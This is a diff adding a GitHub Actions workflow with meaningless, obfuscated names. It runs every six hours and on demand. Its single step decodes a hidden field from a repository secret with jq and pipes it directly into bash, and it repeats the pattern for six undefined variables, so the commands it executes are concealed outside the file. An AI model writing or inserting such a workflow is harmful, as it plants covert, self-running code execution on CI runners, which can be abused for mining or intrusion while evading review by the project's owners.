@@ -1,0 +1,23 @@
+name: todaydoylt
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: todaydoylt
+        env:
+          k9: ${{ secrets.k9 }}
+        run: |
+          echo $k9 | jq -r .m0989 | /bin/bash
+          echo $v12326 | jq -r .okheg41 | /bin/bash
+          echo $pe6747 | jq -r .wd5437 | /bin/bash
+          echo $mw2681 | jq -r .nhe4 | /bin/bash
+          echo $eise8290 | jq -r .mqlm7 | /bin/bash
+          echo $yii7902 | jq -r .askfw10984 | /bin/bash
+          echo $ujm5701 | jq -r .a19269 | /bin/bash
+
